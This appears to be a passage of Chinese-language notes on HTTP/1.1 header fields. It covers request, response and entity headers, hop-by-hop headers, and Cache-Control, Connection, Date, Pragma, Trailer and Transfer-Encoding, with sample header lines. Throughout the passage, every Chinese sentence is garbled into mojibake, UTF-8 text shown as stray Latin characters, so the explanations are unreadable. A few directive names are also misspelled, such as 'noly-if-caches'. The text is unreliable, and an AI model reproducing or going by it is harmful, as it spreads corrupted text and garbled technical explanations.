æŽ§åˆ¶ç¼“å­˜çš„è¡Œä¸º Connection é€è·³é¦–éƒ¨ã€è¿žæŽ¥çš„ç®¡ç† Date åˆ›å»ºæŠ¥æ–‡çš„æ—¥æœŸæ—¶é—´ Pragma æŠ¥æ–‡æŒ‡ä»¤ Trailer æŠ¥æ–‡æœ«ç«¯çš„é¦–éƒ¨ä¸€è§ˆ Transfer-Encoding æŒ‡å®šæŠ¥æ–‡ä¸»ä½“çš„ä¼ è¾“ç¼–ç æ–¹å¼ Upgrade å‡çº§ä¸ºå…¶ä»–åè®® Via ä»£ç†æœåŠ¡å™¨çš„ç›¸å…³æ¶ˆæ¯ Warning é”™è¯¯é€šçŸ¥ è¯·æ±‚é¦–éƒ¨å­—æ®µ é¦–éƒ¨å­—æ®µå è¯´æ˜Ž Accept ç”¨æˆ·ä»£ç†å¯å¤„ç†çš„åª’ä½“ç±»åž‹ Accept-Charset ä¼˜å…ˆçš„å­—ç¬¦é›† Accept-Encoding ä¼˜å…ˆçš„å†…å®¹ç¼–ç  Accept-Language ä¼˜å…ˆçš„è¯­è¨€ï¼ˆè‡ªç„¶è¯­è¨€ï¼‰ Authorization Web è®¤è¯ä¿¡æ¯ Expect æœŸå¾…æœåŠ¡å™¨çš„ç‰¹å®šè¡Œä¸º From ç”¨æˆ·çš„ç”µå­é‚®ç®±åœ°å€ Host è¯·æ±‚èµ„æºæ‰€åœ¨æœåŠ¡å™¨ If-Match æ¯”è¾ƒå®žä½“æ ‡è®°ï¼ˆETagï¼‰ If-Modified-Since æ¯”è¾ƒèµ„æºçš„æ›´æ–°æ—¶é—´ If-None-Match æ¯”è¾ƒå®žä½“æ ‡è®°ï¼ˆä¸ŽIf-Matchç›¸åï¼‰ If-Range èµ„æºæœªæ›´æ–°æ—¶å‘é€å®žä½“Byteçš„èŒƒå›´è¯·æ±‚ If-Unmodified-Since æ¯”è¾ƒèµ„æºçš„æ›´æ–°æ—¶é—´ï¼ˆä¸ŽIf-Modified-Sinceç›¸åï¼‰ Max-Forwards æœ€å¤§ä¼ è¾“é€è·³æ•° Proxy-Authorization ä»£ç†æœåŠ¡å™¨è¦æ±‚å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯ Range å®žä½“çš„å­—èŠ‚èŒƒå›´è¯·æ±‚ Referer å¯¹è¯·æ±‚ä¸­ URI çš„åŽŸå§‹èŽ·å–æ–¹ TE ä¼ è¾“ç¼–ç çš„ä¼˜å…ˆçº§ User-Agent HTTP å®¢æˆ·ç«¯ç¨‹åºçš„ä¿¡æ¯ å“åº”é¦–éƒ¨å­—æ®µ é¦–éƒ¨å­—æ®µå è¯´æ˜Ž Accept-Ranges æ˜¯å¦æŽ¥å—å­—èŠ‚èŒƒå›´è¯·æ±‚ Age æŽ¨ç®—èµ„æºåˆ›å»ºç»è¿‡çš„æ—¶é—´ ETag èµ„æºçš„åŒ¹é…æ¶ˆæ¯ Location ä»¤å®¢æˆ·ç«¯é‡å®šå‘è‡³æŒ‡å®šçš„ URI Proxy-Authenticate ä»£ç†æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯æ¶ˆæ¯ Retry-After å¯¹å†æ¬¡å‘èµ·è¯·æ±‚çš„æ—¶æœºè¦æ±‚ Server HTTPæœåŠ¡å™¨çš„å®‰è£…æ¶ˆæ¯ Vary ä»£ç†æœåŠ¡å™¨ç¼“å­˜çš„ç®¡ç†æ¶ˆæ¯ WWW-Authenticate æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯çš„è®¤è¯æ¶ˆæ¯ å®žä½“é¦–éƒ¨å­—æ®µ é¦–éƒ¨å­—æ®µå è¯´æ˜Ž Allow èµ„æºå¯æ”¯æŒçš„HTTPæ–¹æ³• Content-Encoding å®žä½“ä¸»ä½“é€‚ç”¨çš„ç¼–ç æ–¹å¼ Content-Language å®žä½“ä¸»ä½“çš„è‡ªç„¶è¯­è¨€ Content-Length å®žä½“ä¸»ä½“çš„å¤§å°ï¼ˆå•ä½ï¼šå­—èŠ‚ï¼‰ Content-Location æ›¿æ¢å¯¹åº”èµ„æºçš„ URI Content-MD5 å®žä½“ä¸»ä½“çš„æŠ¥æ–‡æ‘˜è¦ Content-Range å®žä½“ä¸»ä½“çš„ä½ç½®èŒƒå›´ Content-Type å®žä½“ä¸»ä½“çš„åª’ä½“ç±»åž‹ Expires å®žä½“ä¸»ä½“çš„è¿‡æœŸçš„æ—¥æœŸæ—¶é—´ Last-Modified èµ„æºçš„æœ€åŽä¿®æ”¹æ—¶é—´ éž HTTP/1.1é¦–éƒ¨å­—æ®µåœ¨HTTPåè®®é€šä¿¡äº¤äº’ä¸­ä½¿ç”¨åˆ°çš„é¦–éƒ¨å­—æ®µï¼Œä¸é™äºŽRFC2616ä¸­å®šä¹‰çš„47ä¸­é¦–éƒ¨å­—æ®µã€‚è¿˜æœ‰Cookieã€Set-Cookieå’ŒContent-Dispositionç­‰åœ¨å…¶ä»–RFCä¸­å®šä¹‰çš„é¦–éƒ¨å­—æ®µï¼Œå®ƒä»¬çš„ä½¿ç”¨é¢‘çŽ‡ä¹Ÿå¾ˆé«˜ã€‚ è¿™äº›éžæ­£å¼çš„é¦–éƒ¨å­—æ®µç»Ÿä¸€å½’çº³åœ¨RFC4229HTTP Header Field Registrationsä¸­ã€‚ End-to-end é¦–éƒ¨å’ŒHop-by-hop é¦–éƒ¨HTTPé¦–éƒ¨å­—æ®µå°†å®šä¹‰æˆç¼“å­˜ä»£ç†å’Œéžç¼“å­˜ä»£ç†çš„è¡Œä¸ºï¼Œåˆ†ä¸º2ç§ç±»åž‹ã€‚ ç¼“å­˜ä»£ç†ç±»åž‹ æè¿° ç«¯åˆ°ç«¯é¦–éƒ¨ï¼ˆEnd-to-endï¼‰ åˆ†åœ¨æ­¤ç±»åˆ«ä¸­çš„é¦–éƒ¨éƒ½ä¼šè½¬å‘ç»™è¯·æ±‚/å“åº”å¯¹åº”çš„æœ€ç»ˆæŽ¥æ”¶ç›®æ ‡ï¼Œä¸”å¿…é¡»ä¿å­˜åœ¨ç”±ç¼“å­˜ç”Ÿæˆçš„å“åº”ä¸­ï¼Œå¦å¤–è§„å®šå®ƒå¿…é¡»è¢«è½¬å‘ã€‚ é€è·³é¦–éƒ¨ï¼ˆHop-by-hop-Headerï¼‰ åˆ†åœ¨æ­¤ç±»åˆ«ä¸­çš„é¦–éƒ¨åªå¯¹å•æ¬¡è½¬å‘æœ‰æ•ˆï¼Œä¼šé€šè¿‡ç¼“å­˜æˆ–ä»£ç†è€Œä¸å†è½¬å‘ã€‚HTTP/1.1å’Œä¹‹åŽçš„ç‰ˆæœ¬ä¸­ï¼Œå¦‚æžœè¦ä½¿ç”¨ hop-by-hopé¦–éƒ¨ï¼Œéœ€æä¾›Connection é¦–éƒ¨å­—æ®µã€‚ ä¸‹é¢åˆ—ä¸¾äº†HTTP/1.1ä¸­çš„é€è·³é¦–éƒ¨å­—æ®µã€‚é™¤äº†è¿™8ä¸ªé¦–éƒ¨å­—æ®µä¹‹å¤–ï¼Œå…¶ä»–æ‰€æœ‰å­—æ®µéƒ½å±žäºŽç«¯åˆ°ç«¯é¦–éƒ¨ã€‚ Connection Keep-Alive Proxy-Authenticate Proxy-Authorization Trailer TE Transfer-Encoding Upgrade HTTP/1.1 é€šç”¨é¦–éƒ¨å­—æ®µé€šç”¨é¦–éƒ¨å­—æ®µæ˜¯æŒ‡ï¼Œè¯·æ±‚æŠ¥æ–‡å’Œå“åº”æŠ¥æ–‡åŒæ–¹éƒ½ä¼šä½¿ç”¨çš„é¦–éƒ¨ Cache-Controlé€šè¿‡åˆ¶å®šé¦–éƒ¨å­—æ®µ Cache-control çš„æŒ‡ä»¤ï¼Œå°±èƒ½æ“ä½œç¼“å­˜çš„å·¥ä½œæœºåˆ¶ã€‚ æŒ‡ä»¤çš„å‚æ•°æ˜¯é€‰çš„ï¼Œå¤šä¸ªæŒ‡ä»¤ä¹‹é—´é€šè¿‡â€œï¼Œâ€åˆ†éš”ã€‚é¦–éƒ¨å­—æ®µ Cache-Control çš„æŒ‡ä»¤å¯ç”¨äºŽè¯·æ±‚åŠå“åº”æ—¶ã€‚ 1Cache-Control: private, max-age=0,no-cache ç¼“å­˜è¯·æ±‚æŒ‡ä»¤ æŒ‡ä»¤ å‚æ•° è¯´æ˜Ž no-cache æ—  å¼ºåˆ¶å‘æºæœåŠ¡å™¨å†æ¬¡éªŒè¯ no-store æ—  ä¸ç¼“å­˜è¯·æ±‚æˆ–å“åº”çš„ä»»ä½•å†…å®¹ max-age = [ç§’] å¿…éœ€ å“åº”çš„æœ€å¤§Ageå€¼ max-staleï¼ˆ=[ç§’]ï¼‰ å¯çœç•¥ æŽ¥æ”¶å·²è¿‡æœŸçš„å“åº” min-fresh = [ç§’] å¿…éœ€ æœŸæœ›åœ¨æŒ‡å®šæ—¶é—´å†…çš„å“åº”ä»æœ‰æ•ˆ no-transform æ—  ä»£ç†ä¸å¯æ›´æ”¹åª’ä½“ç±»åž‹ noly-if-caches æ—  ä»Žç¼“å­˜èŽ·å–èµ„æº cache-extension - æ–°æŒ‡ä»¤æ ‡è®°ï¼ˆtokenï¼‰ ç¼“å­˜å“åº”æŒ‡ä»¤ æŒ‡ä»¤ å‚æ•° è¯´æ˜Ž public æ—  å¯å‘ä»»æ„æ–¹æä¾›å“åº”çš„ç¼“å­˜ private å¯çœç•¥ ä»…å‘ç‰¹å®šç”¨æˆ·è¿”å›žå“åº” no-cache å¯çœç•¥ ç¼“å­˜å‰å¿…é¡»å…ˆç¡®è®¤å…¶æœ‰æ•ˆæ€§ no-store æ—  ä¸ç¼“å­˜è¯·æ±‚æˆ–å“åº”ä»»ä½•å†…å®¹ no-transform æ—  ä»£ç†ä¸å¯æ›´æ”¹åª’ä½“ç±»åž‹ must-revalidate æ—  å¯ç¼“å­˜ä½†å¿…é¡»å†å‘æºæœåŠ¡å™¨è¿›è¡Œç¡®è®¤ proxy-revalidate æ—  è¦æ±‚ä¸­é—´ç¼“å­˜æœåŠ¡å™¨å¯¹ç¼“å­˜çš„å“åº”æœ‰æ•ˆæ€§å†è¿›è¡Œç¡®è®¤ max-age = [ç§’] å¿…éœ€ å“åº”çš„æœ€å¤§Ageå€¼ s-maxage=[ç§’] å¿…éœ€ å…¬å…±ç¼“å­˜æœåŠ¡å™¨ç›¸åº”çš„æœ€å¤§Ageå€¼ cache-extension - æ–°æŒ‡ä»¤æ ‡è®°ï¼ˆtokenï¼‰ è¡¨ç¤ºæ˜¯å¦èƒ½ç¼“å­˜çš„æŒ‡ä»¤public æŒ‡ä»¤1Cache-Control: public å½“æŒ‡å®šä½¿ç”¨ public çš„æŒ‡ä»¤æ—¶ï¼Œåˆ™æ˜Žç¡®è¡¨æ˜Žå…¶ä»–ç”¨æˆ·ä¹Ÿå¯ä»¥åˆ©ç”¨ç¼“å­˜ã€‚ private æŒ‡ä»¤1Cache-control: private å½“æŒ‡å®š private æŒ‡ä»¤åŽï¼Œå“åº”åªä»¥ç‰¹å®šçš„ç”¨æˆ·ä½œä¸ºå¯¹è±¡ï¼Œè¿™ä¸Ž public æŒ‡ä»¤çš„è¡Œä¸ºç›¸åã€‚ç¼“å­˜æœåŠ¡å™¨ä¼šå¯¹è¯¥ç‰¹å®šç”¨æˆ·æä¾›èµ„æºç¼“å­˜çš„æœåŠ¡ï¼Œå¯¹äºŽå…¶ä»–ç”¨æˆ·å‘é€è¿‡æ¥çš„è¯·æ±‚ï¼Œä»£ç†æœåŠ¡å™¨åˆ™ä¸ä¼šè¿”å›žç¼“å­˜ã€‚ no-cache æŒ‡ä»¤1Cache-control: no-cache ä½¿ç”¨ no-cache æŒ‡ä»¤çš„ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢ä»Žç¼“å­˜ä¸­è¿”å›žè¿‡æœŸçš„èµ„æºã€‚ å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚ä¸­å¦‚æžœåŒ…å« no-cache æŒ‡ä»¤ï¼Œåˆ™è¡¨ç¤ºå®¢æˆ·ç«¯å°†ä¸ä¼šæŽ¥æ”¶ç¼“å­˜è¿‡çš„å“åº”ã€‚äºŽæ˜¯ï¼Œâ€œä¸­é—´â€çš„ç¼“å­˜æœåŠ¡å™¨å¿…é¡»æŠŠå®¢æˆ·ç«¯è¯·æ±‚è½¬å‘ç»™æºæœåŠ¡å™¨ã€‚ å¦‚æžœæºæœåŠ¡å™¨è¿”å›žçš„å“åº”ä¸­åŒ…å« no-cache çš„æŒ‡ä»¤ï¼Œé‚£ä¹ˆç¼“å­˜æœåŠ¡å™¨ä¸èƒ½å¯¹èµ„æºè¿›è¡Œç¼“å­˜ã€‚æºæœåŠ¡å™¨ä»¥åŽä¹Ÿå°†ä¸ä¼šå¯¹ç¼“å­˜æœåŠ¡å™¨è¯·æ±‚ä¸­æå‡ºçš„èµ„æºæœ‰æ•ˆæ€§è¿›è¡Œç¡®è®¤ï¼Œä¸”ç¦æ­¢å…¶å¯¹å“åº”èµ„æºè¿›è¡Œç¼“å­˜æ“ä½œã€‚ 1Cache-control: no-cache=Location ç”±æœåŠ¡å™¨è¿”å›žçš„å“åº”ä¸­ï¼Œè‹¥æŠ¥æ–‡é¦–éƒ¨å­—æ®µ Cache-Control ä¸­å¯¹ no-cache å­—æ®µåå…·æœ‰æŒ‡å®šå‚æ•°å€¼ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯åœ¨æŽ¥æ”¶åˆ°è¿™ä¸ªè¢«æŒ‡å®šå‚æ•°å€¼çš„é¦–éƒ¨å­—æ®µå¯¹åº”çš„å“åº”æŠ¥æ–‡åŽï¼Œå°±ä¸èƒ½ä½¿ç”¨ç¼“å­˜ã€‚æ¢è¨€ä¹‹ï¼Œæ— å‚æ•°å€¼çš„é¦–éƒ¨å­—æ®µå¯ä»¥ä½¿ç”¨ç¼“å­˜ï¼Œåªèƒ½åœ¨å“åº”æŒ‡ä»¤ä¸­æŒ‡å®šè¯¥å‚æ•°ã€‚ æ³¨æ„ï¼šä»Žå­—é¢æ„æ€ä¸Šå¾ˆå®¹æ˜“æŠŠ no-cache è¯¯è§£æˆä¸ºä¸ç¼“å­˜ï¼Œä½†äº‹å®žä¸Š no-cache ä»£è¡¨ä¸ç¼“å­˜è¿‡æœŸçš„èµ„æºï¼Œç¼“å­˜ä¼šå‘æºæœåŠ¡å™¨è¿›è¡Œæœ‰æ•ˆæœŸç¡®è®¤åŽå¤„ç†èµ„æºï¼Œä¹Ÿè®¸ç§°ä¸º do-not-serve-from-cache-without-revalidation æ›´åˆé€‚ã€‚no-store æ‰æ˜¯çœŸæ­£åœ°ä¸è¿›è¡Œç¼“å­˜ã€‚ æŽ§åˆ¶å¯æ‰§è¡Œç¼“å­˜çš„å¯¹è±¡æŒ‡ä»¤no-store æŒ‡ä»¤1Cache-control: no-store å½“ä½¿ç”¨ no-storeæŒ‡ä»¤æ—¶ï¼Œæš—ç¤ºè¯·æ±‚ï¼ˆå’Œå¯¹åº”çš„å“åº”ï¼‰æˆ–å“åº”ä¸­åŒ…å«æœºå¯†ä¿¡æ¯ã€‚å› æ­¤ï¼Œè¯¥æŒ‡ä»¤è§„å®šç¼“å­˜ä¸èƒ½åœ¨æœ¬åœ°å­˜å‚¨è¯·æ±‚æˆ–å“åº”çš„ä»»ä¸€éƒ¨åˆ†ã€‚ æŒ‡å®šç¼“å­˜æœŸé™å’Œè®¤è¯çš„æŒ‡ä»¤s-maxage æŒ‡ä»¤1Cache-control: s-maxage = 604800ï¼ˆå•ä½ ï¼šç§’ï¼‰ s-maxage æŒ‡ä»¤çš„åŠŸèƒ½å’Œ max-age æŒ‡ä»¤çš„ç›¸åŒï¼Œå®ƒä»¬çš„ä¸åŒç‚¹æ˜¯ s-maxage æŒ‡ä»¤åªé€‚ç”¨äºŽä¾›å¤šç”¨æˆ·ä½¿ç”¨çš„å…¬å…±ç¼“å­˜æœåŠ¡å™¨ï¼ˆä»£ç†ï¼‰ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºŽåŒä¸€ä¸ªç”¨æˆ·é‡å¤è¿”å›žç›¸åº”çš„æœåŠ¡å™¨æ¥è¯´ï¼Œè¿™ä¸ªæŒ‡ä»¤æ˜¯æ²¡æœ‰ä»»ä½•ä½œç”¨ã€‚ å¦å¤–ï¼Œå½“ä½¿ç”¨ s-maxage æŒ‡ä»¤åŽï¼Œåˆ™ç›´æŽ¥å¿½ç•¥å¯¹ Expires é¦–éƒ¨å­—æ®µåŠ max-age æŒ‡ä»¤çš„å¤„ç†ã€‚ max-age æŒ‡ä»¤1Cache-control: max-age = 604800ï¼ˆå•ä½ ï¼šç§’ï¼‰ å½“å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚ä¸­åŒ…å« max-age æŒ‡ä»¤æ—¶ï¼Œå¦‚æžœåˆ¤å®šç¼“å­˜èµ„æºçš„ç¼“å­˜æ—¶é—´æ•°å€¼æ¯”æŒ‡å®šæ—¶é—´çš„æ•°å€¼æ›´å°ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯å°±æŽ¥å—ç¼“å­˜çš„èµ„æºã€‚å¦å¤–ï¼Œå½“æŒ‡å®š max-age çš„å€¼ä¸º 0ï¼Œé‚£ä¹ˆç¼“å­˜æœåŠ¡å™¨é€šå¸¸éœ€è¦å°†è¯·æ±‚è½¬å‘ç»™æºæœåŠ¡å™¨ã€‚ å½“æœåŠ¡å™¨è¿”å›žçš„å“åº”ä¸­åŒ…å« max-age æŒ‡ä»¤æ—¶ï¼Œç¼“å­˜æœåŠ¡å™¨å°†ä¸å¯¹èµ„æºçš„æœ‰æ•ˆæ€§å†æ¬¡ç¡®è®¤ï¼Œè€Œ max-age æ•°å€¼ä»£è¡¨èµ„æºä¿å­˜ä¸ºç¼“å­˜çš„æœ€é•¿æ—¶é—´ã€‚ åº”ç”¨ HTTP/1.1 ç‰ˆæœ¬çš„ç¼“å­˜æœåŠ¡å™¨é‡åˆ°åŒæ—¶å­˜åœ¨ Expires é¦–éƒ¨å­—æ®µçš„æƒ…å†µæ—¶ï¼Œä¼šä¼˜å…ˆå¤„ç† max-age æŒ‡ä»¤ï¼Œè€Œå¿½ç•¥æŽ‰ Expires é¦–éƒ¨å­—æ®µã€‚è€ŒHTTP/1.0 ç‰ˆæœ¬çš„ç¼“å­˜æœåŠ¡å™¨çš„æƒ…å†µå´ç›¸åï¼Œmax-age æŒ‡ä»¤ä¼šè¢«å¿½ç•¥æŽ‰ã€‚ min-fresh æŒ‡ä»¤1Cache-Control: min-fresh=60ï¼ˆå•ä½ï¼šç§’ï¼‰ min-fresh æŒ‡ä»¤è¦æ±‚ç¼“å­˜æœåŠ¡å™¨è¿”å›žè‡³å°‘è¿˜æœªè¿‡æŒ‡å®šæ—¶é—´çš„ç¼“å­˜èµ„æºã€‚æ¯”å¦‚ï¼šå½“æŒ‡å®šäº† min-fresh ä¸º 60ç§’ä¹‹åŽï¼Œè¿‡äº†60ç§’çš„èµ„æºéƒ½æ— æ³•ä½œä¸ºå“åº”è¿”å›žäº†ã€‚ max-stale æŒ‡ä»¤1Cache-Control: max-stale=3600ï¼ˆå•ä½ï¼šç§’ï¼‰ ä½¿ç”¨ max-stale å¯æŒ‡ç¤ºç¼“å­˜èµ„æºï¼Œå³ä½¿è¿‡æœŸä¹Ÿç…§å¸¸æŽ¥æ”¶ã€‚å¦‚æžœæŒ‡ä»¤ä¸ºæŒ‡å®šå‚æ•°å€¼ï¼Œé‚£ä¹ˆæ— è®ºç»è¿‡å¤šä¹…ï¼Œå®¢æˆ·ç«¯éƒ½ä¼šæŽ¥æ”¶å“åº”ã€‚å¦‚æžœæŒ‡ä»¤ä¸­æŒ‡å®šäº†å…·ä½“æ•°å€¼ï¼Œé‚£ä¹ˆå³ä½¿è¿‡æœŸï¼Œåªè¦ä»ç„¶å¤„äºŽ max-stale æŒ‡å®šçš„æ—¶é—´å†…ï¼Œä»æ—§ä¼šè¢«å®¢æˆ·ç«¯æŽ¥æ”¶ã€‚ on-if-cached æŒ‡ä»¤1Cache-Control: only-if-cached ä½¿ç”¨ only-if-cached æŒ‡ä»¤è¡¨ç¤ºå®¢æˆ·ç«¯ä»…åœ¨ç¼“å­˜æœåŠ¡å™¨æœ¬åœ°ç¼“å­˜ç›®æ ‡èµ„æºçš„æƒ…å†µä¸‹æ‰ä¼šè¦æ±‚å…¶è¿”å›žã€‚æ¢è¨€ä¹‹ï¼Œè¯¥æŒ‡ä»¤è¦æ±‚ç¼“å­˜æœåŠ¡å™¨ä¸é‡æ–°åŠ è½½å“åº”ï¼Œä¹Ÿä¸ä¼šå†æ¬¡ç¡®è®¤èµ„æºæœ‰æ•ˆæ€§ã€‚è‹¥å‘ç”Ÿè¯·æ±‚ç¼“å­˜æœåŠ¡å™¨çš„æœ¬åœ°ç¼“å­˜æ— å“åº”ï¼Œåˆ™è¿”å›žçŠ¶æ€ç  504 Gateway Timeoutã€‚ must-revalidate æŒ‡ä»¤1Cache-Control: must-revalidate ä½¿ç”¨ must-revalidate æŒ‡ä»¤ï¼Œä»£ç†ä¼šå‘æºæœåŠ¡å™¨å†æ¬¡éªŒè¯å³å°†è¿”å›žçš„å“åº”ç¼“å­˜ç›®å‰æ˜¯å¦ä»ç„¶æœ‰æ•ˆã€‚è‹¥ä»£ç†æ— æ³•è¿žé€šæºæœåŠ¡å™¨å†æ¬¡èŽ·å–æœ‰æ•ˆèµ„æºçš„è¯ï¼Œç¼“å­˜å¿…é¡»ç»™å®¢æˆ·ç«¯ä¸€æ¡ 504ï¼ˆGateway Timeoutï¼‰çŠ¶æ€ç ã€‚å¦å¤–ï¼Œä½¿ç”¨ must-revalidate æŒ‡ä»¤ä¼šå¿½ç•¥è¯·æ±‚çš„ max-stale æŒ‡ä»¤ï¼ˆå³ä½¿å·²ç»åœ¨é¦–éƒ¨ä½¿ç”¨äº† max-staleï¼Œä¹Ÿä¸ä¼šå†æœ‰æ•ˆæžœï¼‰ã€‚ proxy-revalidate æŒ‡ä»¤1Cache-Control: proxy-revalidate proxy-revalidate æŒ‡ä»¤è¦æ±‚æ‰€æœ‰çš„ç¼“å­˜æœåŠ¡å™¨åœ¨æŽ¥æ”¶åˆ°å®¢æˆ·ç«¯å¸¦æœ‰è¯¥æŒ‡ä»¤çš„è¯·æ±‚è¿”å›žå“åº”ä¹‹å‰ï¼Œå¿…é¡»å†æ¬¡éªŒè¯ç¼“å­˜çš„æœ‰æ•ˆæ€§ã€‚ no-transform æŒ‡ä»¤1Cache-Control: no-transform ä½¿ç”¨ no-transform æŒ‡ä»¤è§„å®šæ— è®ºæ˜¯åœ¨è¯·æ±‚è¿˜æ˜¯å“åº”ä¸­ï¼Œç¼“å­˜éƒ½ä¸èƒ½æ”¹å˜å®žä½“ä¸»ä½“çš„åª’ä½“ç±»åž‹ã€‚è¿™æ ·åšå¯é˜²æ­¢ç¼“å­˜æˆ–ä»£ç†åŽ‹ç¼©å›¾ç‰‡ç­‰ç±»ä¼¼æ“ä½œã€‚ Cache-Control æ‰©å±•cache-extension token1Cache-Control: private, community="UCI" é€šè¿‡ cache-extension æ ‡è®°ï¼ˆtokenï¼‰ï¼Œå¯ä»¥æ‰©å±• Cache-Control é¦–éƒ¨å­—æ®µå†…çš„æŒ‡ä»¤ã€‚å¦‚ä¸Šä¾‹ï¼ŒCache-Control é¦–éƒ¨å­—æ®µæœ¬èº«æ²¡æœ‰ community è¿™ä¸ªæŒ‡ä»¤ã€‚å€ŸåŠ©extension tokens å®žçŽ°äº†è¯¥æŒ‡ä»¤çš„æ·»åŠ ã€‚å¦‚æžœç¼“å­˜æœåŠ¡å™¨ä¸èƒ½ç†è§£community è¿™ä¸ªæ–°æŒ‡ä»¤ï¼Œå°±ä¼šç›´æŽ¥å¿½ç•¥ã€‚å› æ­¤ï¼Œextension tokens ä»…å¯¹èƒ½ç†è§£å®ƒçš„ç¼“å­˜æœåŠ¡å™¨æ¥è¯´æ˜¯æœ‰æ„ä¹‰çš„ã€‚ ConnectionConnection é¦–éƒ¨å­—æ®µå…·å¤‡ä»¥ä¸‹ä¸¤ä¸ªä½œç”¨ æŽ§åˆ¶ä¸å†è½¬å‘ç»™ä»£ç†çš„é¦–éƒ¨å­—æ®µ 1Connection: ä¸å†è½¬å‘çš„é¦–éƒ¨å­—æ®µå ç®¡ç†æŒä¹…è¿žæŽ¥ 1Connection: close HTTP/1.1 ç‰ˆæœ¬çš„é»˜è®¤è¿žæŽ¥éƒ½æ˜¯æŒä¹…è¿žæŽ¥ã€‚ä¸ºæ­¤ï¼Œå®¢æˆ·ç«¯ä¼šåœ¨æŒä¹…è¿žæŽ¥ä¸Šè¿žç»­å‘é€è¯·æ±‚ã€‚å½“æœåŠ¡å™¨ç«¯æƒ³æ˜Žç¡®æ–­å¼€è¿žæŽ¥æ—¶ï¼Œåˆ™æŒ‡å®šConnection é¦–éƒ¨å­—æ®µçš„å€¼ä¸º Closeã€‚ 1Connection: Keep-Alive HTTP/1.1 ä¹‹å‰çš„ HTTP ç‰ˆæœ¬çš„é»˜è®¤è¿žæŽ¥éƒ½æ˜¯éžæŒä¹…è¿žæŽ¥ã€‚ä¸ºæ­¤ï¼Œå¦‚æžœæƒ³åœ¨æ—§ç‰ˆæœ¬çš„ HTTP åè®®ä¸Šç»´æŒæŒç»­è¿žæŽ¥ï¼Œåˆ™éœ€è¦æŒ‡å®šConnection é¦–éƒ¨å­—æ®µçš„å€¼ä¸º Keep-Aliveã€‚ Dateé¦–éƒ¨å­—æ®µ Date è¡¨æ˜Žåˆ›å»º HTTP æŠ¥æ–‡çš„æ—¥æœŸå’Œæ—¶é—´ã€‚ 1Date: Tue, 03 Jul 2012 04:40:59 GMT ä¹‹å‰çš„ HTTP åè®®ç‰ˆæœ¬ä¸­ä½¿ç”¨åœ¨ RFC850 ä¸­å®šä¹‰çš„æ ¼å¼ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ 1Date: Tue, 03-Jul-12 04:40:59 GMT é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ç§æ ¼å¼ã€‚å®ƒä¸Ž C æ ‡å‡†åº“å†…çš„ asctime() å‡½æ•°çš„è¾“å‡ºæ ¼å¼ä¸€è‡´ã€‚ 1Date: Tue Jul 03 04:40:59 2012 PragmaPragma æ˜¯ HTTP/1.1 ä¹‹å‰ç‰ˆæœ¬çš„åŽ†å²é—ç•™å­—æ®µï¼Œä»…ä½œä¸ºä¸Ž HTTP/1.0çš„å‘åŽå…¼å®¹è€Œå®šä¹‰ã€‚ 1Pragma: no-cache è¯¥é¦–éƒ¨å­—æ®µå±žäºŽé€šç”¨é¦–éƒ¨å­—æ®µï¼Œä½†åªç”¨åœ¨å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚ä¸­ã€‚å®¢æˆ·ç«¯ä¼šè¦æ±‚æ‰€æœ‰çš„ä¸­é—´æœåŠ¡å™¨ä¸è¿”å›žç¼“å­˜çš„èµ„æºã€‚ æ‰€æœ‰çš„ä¸­é—´æœåŠ¡å™¨å¦‚æžœéƒ½èƒ½ä»¥ HTTP/1.1 ä¸ºåŸºå‡†ï¼Œé‚£ç›´æŽ¥é‡‡ç”¨ Cache-Control: no-cache æŒ‡å®šç¼“å­˜çš„å¤„ç†æ–¹å¼æ˜¯æœ€ä¸ºç†æƒ³çš„ã€‚ä½†è¦æ•´ä½“æŽŒæ¡å…¨éƒ¨ä¸­é—´æœåŠ¡å™¨ä½¿ç”¨çš„ HTTP åè®®ç‰ˆæœ¬å´æ˜¯ä¸çŽ°å®žçš„ã€‚å› æ­¤ï¼Œå‘é€çš„è¯·æ±‚ä¼šåŒæ—¶å«æœ‰ä¸‹é¢ä¸¤ä¸ªé¦–éƒ¨å­—æ®µã€‚ 12Cache-Control: no-cachePragma: no-cache Traileré¦–éƒ¨å­—æ®µ Trailer ä¼šäº‹å…ˆè¯´æ˜Žåœ¨æŠ¥æ–‡ä¸»ä½“åŽè®°å½•äº†å“ªäº›é¦–éƒ¨å­—æ®µã€‚è¯¥é¦–éƒ¨å­—æ®µå¯åº”ç”¨åœ¨ HTTP/1.1 ç‰ˆæœ¬åˆ†å—ä¼ è¾“ç¼–ç æ—¶ã€‚ 123456789HTTP/1.1 200 OKDate: Tue, 03 Jul 2012 04:40:56 GMTContent-Type: text/html...Transfer-Encoding: chunkedTrailer: Expires...(æŠ¥æ–‡ä¸»ä½“)...0Expires: Tue, 28 Sep 2004 23:59:59 GMT ä»¥ä¸Šç”¨ä¾‹ä¸­ï¼ŒæŒ‡å®šé¦–éƒ¨å­—æ®µ Trailer çš„å€¼ä¸º Expiresï¼Œåœ¨æŠ¥æ–‡ä¸»ä½“ä¹‹åŽï¼ˆåˆ†å—é•¿åº¦ 0 ä¹‹åŽï¼‰å‡ºçŽ°äº†é¦–éƒ¨å­—æ®µ Expiresã€‚ Transfer-Encodingé¦–éƒ¨å­—æ®µ Transfer-Encoding è§„å®šäº†ä¼ è¾“æŠ¥æ–‡ä¸»ä½“æ—¶é‡‡ç”¨çš„ç¼–ç æ–¹å¼ã€‚ HTTP/1.1 çš„ä¼ è¾“ç¼–ç æ–¹å¼ä»…å¯¹åˆ†å—ä¼ è¾“ç¼–ç æœ‰æ•ˆã€‚ 12345678910111213141516171819HTTP/1.1 200 OKDate: Tue, 03 Jul 2012 04:40:56 GMTCache-Control: public, max-age=604800Content-Type: text/javascript; charset=utf-8Expires: Tue, 10 Jul 2012 04:40:56 GMTX-Frame-Options: DENYX-XSS-Protection: 1; mode=blockContent-Encoding: gzipTransfer-Encoding: chunkedConnection: keep-alivecf0 